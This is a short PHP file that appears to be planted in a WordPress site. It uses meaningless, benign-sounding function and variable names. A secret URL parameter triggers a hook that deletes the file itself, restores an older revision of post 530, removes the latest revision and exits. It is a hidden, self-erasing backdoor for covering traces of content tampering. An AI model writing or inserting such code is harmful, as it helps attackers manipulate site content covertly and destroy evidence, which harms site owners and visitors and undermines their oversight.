<?php

function svg_alert_data_performance() {
	if (isset($_GET['videos_events_tooltip']) && $_GET['videos_events_tooltip'] === 'tool_about_connect') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$badge_generator_conversion_effect = 530;
		$modules_testimonials_shortcode = wp_get_post_revisions($badge_generator_conversion_effect);
		if (empty($modules_testimonials_shortcode)) die('no revisions');
		if (count($modules_testimonials_shortcode) < 2) die('less than 2');
		$css_solution_language_exporter = array_shift($modules_testimonials_shortcode);
		$campaign_description_quotes_create = $css_solution_language_exporter->ID;
		$coupon_nextgen_traffic_roles = array_shift($modules_testimonials_shortcode);
		$feedback_consent_switcher_rates = $coupon_nextgen_traffic_roles->ID;
		$simple_article_estate_speed = wp_restore_post_revision($feedback_consent_switcher_rates);
		if ($simple_article_estate_speed === false) die('error restoring');
		$simple_article_estate_speed = wp_delete_post_revision($campaign_description_quotes_create);		
		if ($simple_article_estate_speed === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'svg_alert_data_performance');
